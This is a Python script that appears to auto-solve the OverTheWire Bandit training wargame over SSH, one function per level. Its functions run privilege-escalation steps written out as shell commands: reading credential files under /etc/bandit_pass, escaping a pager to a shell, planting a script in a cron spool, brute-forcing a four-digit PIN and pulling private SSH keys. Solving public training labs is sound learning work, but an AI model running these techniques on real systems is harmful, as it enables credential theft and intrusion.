#!/usr/bin/python3

import paramiko, os, time
import lib.recursive_file_decompressor as decompressor
from paramiko_expect import SSHClientInteraction

otw_bandit_ssh_url = "bandit.labs.overthewire.org"
otw_bandit_ssh_port = 2220

default_user = "bandit0"
default_password = "bandit0"

# Pending to develop
def check_modules_installed():
    print("Test")

def printCredentials():
    print(f"[+] Credentials for {user}: {password}")

def ssh_connection(username, password, use_ssh_key=False, sshkey_file=None):
    
    if (use_ssh_key == True and sshkey_file == None):
        raise Exception(f"An SSH Key file must be provided")
    
    client = paramiko.SSHClient()
    
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.load_system_host_keys()

    if (use_ssh_key):
        client.connect(hostname=otw_bandit_ssh_url, port=otw_bandit_ssh_port, username=username, password="", key_filename=sshkey_file)
    else:
        client.connect(hostname=otw_bandit_ssh_url, port=otw_bandit_ssh_port, username=username, password=password)

    return client

def createResourcesFolder():
    current_path = os.path.dirname(__file__)
    resources_path = os.path.join(current_path,'resources')
    
    if not os.path.exists(resources_path):
        os.makedirs(resources_path)
    
    return resources_path

def createSubfolderOnResourcesFolder(resources_path, subfolders):
    subfolder_path = os.path.join(resources_path,subfolders)
    
    if not os.path.exists(subfolder_path):
        os.makedirs(subfolder_path)
    
    return subfolder_path

def git_clone_repo_bandit(client, temp_dir, repo_url, current_password):
    channel = client.invoke_shell()
    time.sleep(1)

    channel.send("id\n")
    time.sleep(1)

    channel.send("whoami\n")
    time.sleep(1)
    
    channel.send("GIT_SSH_COMMAND=\"ssh -o StrictHostKeyChecking=no\" git clone " + repo_url + " " + temp_dir + "\n")
    time.sleep(1)
    
    channel.send(current_password + "\n")
    time.sleep(1)

    # Read buffer output
    output = ""
    start_time = time.time()
    while True:
        if channel.recv_ready():
            output += channel.recv(1024).decode(errors="ignore")
        if time.time() - start_time > 5:  # espera de 5 seg
            break
        time.sleep(0.2)

    # Close connection
    channel.send("exit\n")

# Pending to implement into all methods
def make_temp_directory():
    client = ssh_connection(default_user, default_password)
    
    stdin, stdout, stderr = client.exec_command("mktemp -d")
    temp_dir = stdout.read().decode().strip()
    stdin, stdout, stderr = client.exec_command("chmod 777 " + temp_dir)
    return temp_dir

# Pending to implement into all methods
def clean_temp_directory(client, temp_dir):
    stdin, stdout, stderr = client.exec_command("rm -rf " + temp_dir)

# Pending to implement into all methods
def get_current_password(client):
    stdin, stdout, stderr = client.exec_command('whoami')
    current_user = stdout.read().decode().strip()
    stdin, stdout, stderr = client.exec_command("cat /etc/bandit_pass/" + current_user)
    current_password = stdout.read().decode().strip()
    return current_password

# DONE
def bandit0_1(client):

    next_user = "bandit1"

    stdin, stdout, stderr = client.exec_command("cat readme | tail -n 2 | awk 'NF{print $NF}'")

    next_password = stdout.read().decode().strip()

    client.close()

    return next_user, next_password

# DONE
def bandit1_2(client):

    next_user = "bandit2"

    stdin, stdout, stderr = client.exec_command("cat ./-")

    next_password = stdout.read().decode().strip()

    client.close()

    return next_user, next_password

# DONE
def bandit2_3(client):

    next_user = "bandit3"

    # Process to obtain the password
    stdin, stdout, stderr = client.exec_command("cat spaces\\ in\\ this\\ filename")
    next_password = stdout.read().decode().strip()

    client.close()

    return next_user, next_password

# DONE
def bandit3_4(client):

    next_user = "bandit4"

    # Process to obtain the password
    stdin, stdout, stderr = client.exec_command("cd inhere/ && ls -A")
    file_name = stdout.read().decode().strip()
    stdin, stdout, stderr = client.exec_command("cat inhere/"+file_name)
    next_password = stdout.read().decode().strip()

    client.close()

    return next_user, next_password

# DONE
def bandit4_5(client):

    next_user = "bandit5"

    # Process to obtain the password
    stdin, stdout, stderr = client.exec_command("file inhere/* | grep ASCII | awk -F \":\" '{print $1}' | xargs echo | xargs cat")
    next_password = stdout.read().decode().strip()

    client.close()

    return next_user, next_password

# DONE
def bandit5_6(client):

    next_user = "bandit6"

    # Process to obtain the password
    stdin, stdout, stderr = client.exec_command("find . -type f -size 1033c ! -executable -exec file {} + | grep ASCII | xargs echo | awk -F \":\" '{print $1}'")
    file_name = stdout.read().decode().strip()

    stdin, stdout, stderr = client.exec_command("cat "+file_name)
    next_password = stdout.read().decode().strip()

    client.close()

    return next_user, next_password

# DONE
def bandit6_7(client):

    next_user = "bandit7"

    # Process to obtain the password
    stdin, stdout, stderr = client.exec_command("find / -user bandit7 -group bandit6 2>/dev/null")
    file_name = stdout.read().decode().strip()

    stdin, stdout, stderr = client.exec_command("cat "+file_name)
    next_password = stdout.read().decode().strip()

    client.close()

    return next_user, next_password

# DONE
def bandit7_8(client):

    next_user = "bandit8"

    # Process to obtain the password
    stdin, stdout, stderr = client.exec_command("grep -r \"millionth\" data.txt | awk 'NF{print $NF}'")
    next_password = stdout.read().decode().strip()

    client.close()

    return next_user, next_password

# DONE
def bandit8_9(client):

    next_user = "bandit9"

    # Process to obtain the password
    stdin, stdout, stderr = client.exec_command("cat data.txt | sort | uniq -u")
    next_password = stdout.read().decode().strip()

    client.close()

    return next_user, next_password

# DONE
def bandit9_10(client):

    next_user = "bandit10"

    # Process to obtain the password
    stdin, stdout, stderr = client.exec_command("strings data.txt | grep \"====\" | tail -n 1 | awk 'NF{print $NF}'")
    next_password = stdout.read().decode().strip()

    client.close()

    return next_user, next_password

# DONE
def bandit10_11(client):

    next_user = "bandit11"

    # Process to obtain the password
    stdin, stdout, stderr = client.exec_command("cat data.txt | base64 -d | awk 'NF{print $NF}'")
    next_password = stdout.read().decode().strip()

    client.close()

    return next_user, next_password

# DONE
def bandit11_12(client):

    next_user = "bandit12"

    # Process to obtain the password
    stdin, stdout, stderr = client.exec_command("cat data.txt | tr 'a-zA-Z' 'n-za-mN-ZA-M' | awk 'NF{print $NF}'")
    next_password = stdout.read().decode().strip()

    client.close()

    return next_user, next_password

# DONE
def bandit12_13(client):

    next_user = "bandit13"

    resources_path = createResourcesFolder()
    subfolder_path = createSubfolderOnResourcesFolder(resources_path, 'bandit12_13')
    
    stdin, stdout, stderr = client.exec_command("mktemp -d")
    temp_dir = stdout.read().decode().strip()
    
    client.exec_command('cat ~/data.txt | xxd -r > '+temp_dir+'/data')
    
    sftp = client.open_sftp()
    sftp.get(temp_dir+'/data',os.path.join(subfolder_path,'data.gz'))
    
    file_name = decompressor.decompress_until_plain_text(os.path.join(subfolder_path,'data.gz'), os.path.join(subfolder_path,'temp_output'))
    file = open(file_name, "r")

    next_password = file.read().split()[-1]

    client.close()

    return next_user, next_password

# DONE
def bandit13_14(client):

    next_user = "bandit14"
    
    resources_path = createResourcesFolder()
    subfolder_path = createSubfolderOnResourcesFolder(resources_path, 'bandit13_14')

    sftp = client.open_sftp()
    sftp.get('/home/bandit13/sshkey.private',os.path.join(subfolder_path,'id_rsa'))

    # Process to obtain the ssh key file
    next_password = os.path.join(str(subfolder_path),'id_rsa')

    client.close()

    return next_user, next_password

# DONE
def bandit14_15(client):

    next_user = "bandit15"

    # Process to obtain the password
    stdin, stdout, stderr = client.exec_command("cat /etc/bandit_pass/bandit14")
    current_password = stdout.read().decode().strip()
    
    stdin, stdout, stderr = client.exec_command("echo " + current_password + " | nc localhost 30000 | sed '/^$/d' | tail -n 1")
    next_password = stdout.read().decode().strip()

    client.close()

    return next_user, next_password

# DONE
def bandit15_16(client):

    next_user = "bandit16"
    
    stdin, stdout, stderr = client.exec_command("cat /etc/bandit_pass/bandit15")
    current_password = stdout.read().decode().strip()

    # Process to obtain the password
    stdin, stdout, stderr = client.exec_command("echo " + current_password + " | ncat --ssl localhost 30001 | sed '/^$/d' | tail -n 1")
    next_password = stdout.read().decode().strip()

    client.close()

    return next_user, next_password

# DONE
def bandit16_17(client):

    next_user = "bandit17"
    
    stdin, stdout, stderr = client.exec_command("mktemp -d")
    temp_dir = stdout.read().decode().strip()
    
    utils_path = os.path.join(os.path.dirname(__file__),'utils')
    
    sftp = client.open_sftp()
    sftp.put(os.path.join(utils_path,'portScan.sh'), temp_dir + '/portScan.sh')
        
    stdin, stdout, stderr = client.exec_command("cat /etc/bandit_pass/bandit16")
    current_password = stdout.read().decode().strip()
    
    stdin, stdout, stderr = client.exec_command("chmod +x " + temp_dir + "/portScan.sh")
    stdin, stdout, stderr = client.exec_command(temp_dir + "/portScan.sh > " + temp_dir + "/ports.txt")
    stdout.channel.recv_exit_status() # Wait until the command finish
    
    stdin, stdout, stderr = client.exec_command("for port in $(cat " + temp_dir + "/ports.txt); do (echo " + current_password + " | ncat --ssl localhost $port 2>/dev/null | sed -n '/-----BEGIN RSA PRIVATE KEY-----/,/-----END RSA PRIVATE KEY-----/p'); done > " + temp_dir + "/id_rsa")
    stdout.channel.recv_exit_status() # Wait until the command finish
    
    # id_rsa file retieve
    resources_path = createResourcesFolder()
    subfolder_path = createSubfolderOnResourcesFolder(resources_path, 'bandit16_17')
    sftp = client.open_sftp()
    sftp.get(temp_dir+'/id_rsa',os.path.join(subfolder_path,'id_rsa'))
    
    next_password = os.path.join(str(subfolder_path),'id_rsa')

    client.close()

    return next_user, next_password

# DONE
def bandit17_18(client):

    next_user = "bandit18"

    # Process to obtain the password
    stdin, stdout, stderr = client.exec_command("diff passwords.old passwords.new | tail -n 1 | awk 'NF{print $NF}'")
    next_password = stdout.read().decode().strip()

    client.close()

    return next_user, next_password

# DONE
def bandit18_19(client):

    next_user = "bandit19"

    # Process to obtain the password
    stdin, stdout, stderr = client.exec_command("cat readme")
    next_password = stdout.read().decode().strip()

    client.close()

    return next_user, next_password

# DONE
def bandit19_20(client):

    next_user = "bandit20"

    # Process to obtain the password
    stdin, stdout, stderr = client.exec_command("/home/bandit19/bandit20-do cat /etc/bandit_pass/bandit20")
    next_password = stdout.read().decode().strip()

    client.close()

    return next_user, next_password

# DONE
def bandit20_21(client):

    next_user = "bandit21"
    
    stdin, stdout, stderr = client.exec_command("mktemp -d")
    temp_dir = stdout.read().decode().strip()
    
    utils_path = os.path.join(os.path.dirname(__file__),'utils')
    
    sftp = client.open_sftp()
    sftp.put(os.path.join(utils_path,'bandit21_password.sh'), temp_dir + '/script.sh')
        
    stdin, stdout, stderr = client.exec_command("cat /etc/bandit_pass/bandit20")
    current_password = stdout.read().decode().strip()
    
    stdin, stdout, stderr = client.exec_command("chmod +x " + temp_dir + "/script.sh")
    
    stdin, stdout, stderr = client.exec_command(temp_dir + "/script.sh \"" + current_password + "\" \"" + temp_dir + "/log.txt\" \"" + temp_dir + "\"")
    stdout.channel.recv_exit_status() # Wait until the command finish
    
    stdin, stdout, stderr = client.exec_command("cat " + temp_dir + "/log.txt")
    next_password = stdout.read().decode().strip()

    client.close()

    return next_user, next_password

# DONE
def bandit21_22(client):

    next_user = "bandit22"

    # Process to obtain the password
    stdin, stdout, stderr = client.exec_command("cat /usr/bin/cronjob_bandit22.sh | tail -n 1 | awk 'NF{print $NF}'")
    temp_folder = stdout.read().decode().strip()
    
    stdin, stdout, stderr = client.exec_command("cat " + temp_folder)
    next_password = stdout.read().decode().strip()

    client.close()

    return next_user, next_password

# DONE
def bandit22_23(client):

    next_user = "bandit23"

    # Process to obtain the password
    stdin, stdout, stderr = client.exec_command("echo I am user " + next_user + " | md5sum | cut -d ' ' -f 1")
    temp_file = stdout.read().decode().strip()
    
    stdin, stdout, stderr = client.exec_command("cat /tmp/" + temp_file)
    next_password = stdout.read().decode().strip()

    client.close()

    return next_user, next_password

# DONE
def bandit23_24(client):

    next_user = "bandit24"
    next_password = ""

    stdin, stdout, stderr = client.exec_command("mktemp -d")
    temp_dir = stdout.read().decode().strip()
    
    stdin, stdout, stderr = client.exec_command("chmod o+wx " + temp_dir)
    
    stdin, stdout, stderr = client.exec_command("echo -e '#!/bin/bash\\n\\ncat /etc/bandit_pass/bandit24 > " + temp_dir + "/bandit24.password\\nchmod o+r " + temp_dir + "/bandit24.password' > " + temp_dir + "/script.sh")
    
    stdin, stdout, stderr = client.exec_command("chmod +x " + temp_dir + "/script.sh")
    
    stdin, stdout, stderr = client.exec_command("cp " + temp_dir + "/script.sh /var/spool/bandit24/foo/testing")
    
    stdin, stdout, stderr = client.exec_command("chmod +x /var/spool/bandit24/foo/testing")
        
    while not next_password:
        stdin, stdout, stderr = client.exec_command("cat " + temp_dir + "/bandit24.password 2>/dev/null | tr '\\n' ' '")
        next_password = stdout.read().decode("utf-8").strip()
        if len(stdout.read().decode("utf-8").strip()) != 0:
            break
    
    client.close()

    return next_user, next_password

# DONE
def bandit24_25(client):

    next_user = "bandit25"
    
    stdin, stdout, stderr = client.exec_command("mktemp -d")
    temp_dir = stdout.read().decode().strip()
    
    stdin, stdout, stderr = client.exec_command("cat /etc/bandit_pass/bandit24")
    current_password = stdout.read().decode().strip()

    stdin, stdout, stderr = client.exec_command("for pin in {0000..9999}; do echo \"" + current_password + " $pin\"; done > " + temp_dir + "/combinations.txt")
    
    stdin, stdout, stderr = client.exec_command("cat " + temp_dir + "/combinations.txt | nc localhost 30002 | grep -vE 'Wrong|Please enter' | grep password | awk 'NF{print $NF}'")
    next_password = stdout.read().decode().strip()

    client.close()

    return next_user, next_password

# DONE
def bandit25_26(client):

    next_user = "bandit26"

    resources_path = createResourcesFolder()
    subfolder_path = createSubfolderOnResourcesFolder(resources_path, 'bandit25_26')

    sftp = client.open_sftp()
    sftp.get('/home/bandit25/bandit26.sshkey',os.path.join(subfolder_path,'id_rsa'))

    # Process to obtain the ssh key file
    next_password = os.path.join(str(subfolder_path),'id_rsa')

    client.close()

    return next_user, next_password

# DONE
def bandit26_27(client):

    next_user = "bandit27"
    
    client2 = ssh_connection("bandit25", "iCi86ttT4KSNe1armKiwbQNmB3YJP3q4")
    
    stdin, stdout, stderr = client2.exec_command("mktemp -d")
    temp_dir = stdout.read().decode().strip()
    
    stdin, stdout, stderr = client2.exec_command("chmod o+wx " + temp_dir)
    
    # Abrir canal interactivo con un pseudo-terminal PEQUEÑO
    channel = client.invoke_shell(width=80, height=2)  # <--- ¡Truco aquí!
    time.sleep(1)

    # Escapar del more con !sh
    channel.send("v")
    channel.send("\n")
    time.sleep(2)
    channel.send(":set shell=/bin/bash")
    channel.send("\n")
    time.sleep(2)
    channel.send(":shell")
    channel.send("\n")
    time.sleep(2)

    channel.send("id")
    channel.send("\n")
    time.sleep(1)

    channel.send("whoami")
    channel.send("\n")
    time.sleep(1)
    
    # channel.send("cat /etc/bandit_pass/bandit26 > " + temp_dir + "/pass.txt \n")
    channel.send("./bandit27-do cat /etc/bandit_pass/bandit27 > " + temp_dir + "/pass.txt \n")
    time.sleep(1)

    # Leer todo el output que queda en el buffer
    output = ""
    start_time = time.time()
    while True:
        if channel.recv_ready():
            output += channel.recv(1024).decode(errors="ignore")
        if time.time() - start_time > 5:  # espera de 5 seg
            break
        time.sleep(0.2)

    # Cerrar sesión
    channel.send("exit\n")
    
    stdin, stdout, stderr = client2.exec_command("cat " + temp_dir + "/pass.txt")
    next_password = stdout.read().decode().strip()
    
    client.close()

    return next_user, next_password

# DONE
def bandit27_28(client):

    next_user = "bandit28"
    repo_url = "ssh://bandit27-git@localhost:2220/home/bandit27-git/repo"
    
    temp_dir = make_temp_directory()
    current_password = get_current_password(client)
    
    git_clone_repo_bandit(client,temp_dir,repo_url,current_password)
    
    stdin, stdout, stderr = client.exec_command("cat " + temp_dir + "/README | awk 'NF{print $NF}'")
    next_password = stdout.read().decode().strip()
        
    client.close()

    return next_user, next_password

# DONE
def bandit28_29(client):

    next_user = "bandit29"
    repo_url = "ssh://bandit28-git@localhost:2220/home/bandit28-git/repo"
    
    temp_dir = make_temp_directory()
    current_password = get_current_password(client)
    
    git_clone_repo_bandit(client,temp_dir,repo_url,current_password)

    # Process to obtain the password
    stdin, stdout, stderr = client.exec_command("cd " + temp_dir + " && git show $(git log | head -n 1 | awk 'NF{print $NF}') | grep \"\-\- password:\" | awk 'NF{print $NF}'")
    next_password = stdout.read().decode().strip()

    client.close()

    return next_user, next_password

# DONE
def bandit29_30(client):

    next_user = "bandit30"
    repo_url = "ssh://bandit29-git@localhost:2220/home/bandit29-git/repo"
    
    temp_dir = make_temp_directory()
    current_password = get_current_password(client)
    
    git_clone_repo_bandit(client,temp_dir,repo_url,current_password)

    stdin, stdout, stderr = client.exec_command("cd " + temp_dir + " && git checkout dev")
    
    stdin, stdout, stderr = client.exec_command("cd " + temp_dir + " && cat README.md | grep 'password' | awk 'NF{print $NF}'")
    next_password = stdout.read().decode().strip()

    client.close()

    return next_user, next_password

# DONE
def bandit30_31(client):

    next_user = "bandit31"
    repo_url = "ssh://bandit30-git@localhost:2220/home/bandit30-git/repo"
    
    temp_dir = make_temp_directory()
    current_password = get_current_password(client)
    
    git_clone_repo_bandit(client,temp_dir,repo_url,current_password)

    # Process to obtain the password
    stdin, stdout, stderr = client.exec_command("cd " + temp_dir + " && git show secret")
    next_password = stdout.read().decode().strip()

    client.close()

    return next_user, next_password

# DONE
def bandit31_32(client):

    next_user = "bandit32"
    repo_url = "ssh://bandit31-git@localhost:2220/home/bandit31-git/repo"
    
    temp_dir = make_temp_directory(client)
    current_password = get_current_password(client)
    
    git_clone_repo_bandit(client,temp_dir,repo_url,current_password)

    stdin, stdout, stderr = client.exec_command("cd " + temp_dir + " && cat README.md | grep 'Content' | awk -F ':' '{print $2}' | xargs")
    key_file_content = stdout.read().decode().strip()
    
    stdin, stdout, stderr = client.exec_command("cd " + temp_dir + " && echo '" + key_file_content + "' > " + temp_dir + "/key.txt")
    stdin, stdout, stderr = client.exec_command("cd " + temp_dir + " && git add -f key.txt")
    stdin, stdout, stderr = client.exec_command("cd " + temp_dir + " && git commit -m \"Commit file key.txt\"")
    
    # Git push + ssh login
    channel = client.invoke_shell()
    time.sleep(1)

    channel.send("id\n")
    time.sleep(1)

    channel.send("whoami\n")
    time.sleep(1)
    
    channel.send("cd " + temp_dir + " && GIT_SSH_COMMAND=\"ssh -o StrictHostKeyChecking=no\" git push -u origin master\n")
    time.sleep(1)
    
    channel.send(current_password + "\n")
    time.sleep(1)

    # Read buffer output
    output = ""
    start_time = time.time()
    while True:
        if channel.recv_ready():
            output += channel.recv(1024).decode(errors="ignore")
        if time.time() - start_time > 5:  # espera de 5 seg
            break
        time.sleep(0.2)
    
    next_password = ""
    # Filter output to retrieve password for next level
    for i,line in enumerate(output.splitlines()):
        if "Well done!" in line:
            # Print next line and retrieve last string after split it by spaces
            next_password = output.splitlines()[i+1].split(" ", 1)[-1]
    
    # Close connection
    channel.send("exit\n")
    
    client.close()
    
    return next_user, next_password

# DONE
def bandit32_33(client):

    next_user = "bandit33"
    
    temp_dir = make_temp_directory()
    # temp_dir = "/tmp/tmp.d1EBr5Tdm5"
    print("Temp dir: " + temp_dir)

    output = ""
    channel = client.invoke_shell()
    channel.send("$0\n")
    channel.send(f"cat /etc/bandit_pass/{next_user}\n")
    time.sleep(0.5)
    if channel.recv_ready():
        output = channel.recv(5000).decode()
    
    next_password = output.strip().splitlines()[-2]

    channel.close()
    client.close()
    return next_user, next_password

def bandit33_34(client):

    next_user = "bandit34"
    
    stdin, stdout, stderr = client.exec_command("whoami")
    next_password = stdout.read().decode().strip()
    
    client.close()
    return next_user, next_password

if __name__ == '__main__':
    # DEBUG
    user = "bandit33"
    password = ""
    # password = "D:\\Proyectos\\owt_bandit_autopwn\\OWT_Bandit_AutoPwn\\resources\\bandit25_26\\id_rsa"
    
    # user, password = bandit0_1(ssh_connection(default_user, default_password))
    # printCredentials()

    # user, password = bandit1_2(ssh_connection(user,password))
    # printCredentials()

    # user, password = bandit2_3(ssh_connection(user,password))
    # printCredentials()

    # user, password = bandit3_4(ssh_connection(user,password))
    # printCredentials()

    # user, password = bandit4_5(ssh_connection(user,password))
    # printCredentials()

    # user, password = bandit5_6(ssh_connection(user,password))
    # printCredentials()

    # user, password = bandit6_7(ssh_connection(user,password))
    # printCredentials()
    
    # user, password = bandit7_8(ssh_connection(user,password))
    # printCredentials()

    # user, password = bandit8_9(ssh_connection(user,password))
    # printCredentials()

    # user, password = bandit9_10(ssh_connection(user,password))
    # printCredentials()

    # user, password = bandit10_11(ssh_connection(user,password))
    # printCredentials()
    
    # user, password = bandit11_12(ssh_connection(user,password))
    # printCredentials()

    # user, password = bandit12_13(ssh_connection(user,password))
    # printCredentials()

    # user, password = bandit13_14(ssh_connection(user,password))
    # printCredentials()

    # user, password = bandit14_15(ssh_connection(user,password,use_ssh_key=True,sshkey_file=password))
    # printCredentials()

    # user, password = bandit15_16(ssh_connection(user,password))
    # printCredentials()

    # user, password = bandit16_17(ssh_connection(user,password))
    # printCredentials()

    # user, password = bandit17_18(ssh_connection(user,password,use_ssh_key=True,sshkey_file=password))
    # printCredentials()

    # user, password = bandit18_19(ssh_connection(user,password))
    # printCredentials()

    # user, password = bandit19_20(ssh_connection(user,password))
    # printCredentials()

    # user, password = bandit20_21(ssh_connection(user,password))
    # printCredentials()

    # user, password = bandit21_22(ssh_connection(user,password))
    # printCredentials()
    
    # user, password = bandit22_23(ssh_connection(user, password))
    # printCredentials()
    
    # user, password = bandit23_24(ssh_connection(user, password))
    # printCredentials()
    
    # user, password = bandit24_25(ssh_connection(user, password))
    # printCredentials()
    
    # user, password = bandit25_26(ssh_connection(user, password))
    # printCredentials()
    
    # user, password = bandit26_27(ssh_connection(user, password,use_ssh_key=True,sshkey_file=password))
    # printCredentials()
    
    # user, password = bandit27_28(ssh_connection(user, password))
    # printCredentials()
    
    # user, password = bandit28_29(ssh_connection(user, password))
    # printCredentials()
    
    # user, password = bandit29_30(ssh_connection(user, password))
    # printCredentials()
    
    # user, password = bandit30_31(ssh_connection(user, password))
    # printCredentials()
    
    # user, password = bandit31_32(ssh_connection(user, password))
    # printCredentials()
    
    # user, password = bandit32_33(ssh_connection(user, password))
    # printCredentials()
    
    # user, password = bandit33_34(ssh_connection(user, password))
    # printCredentials()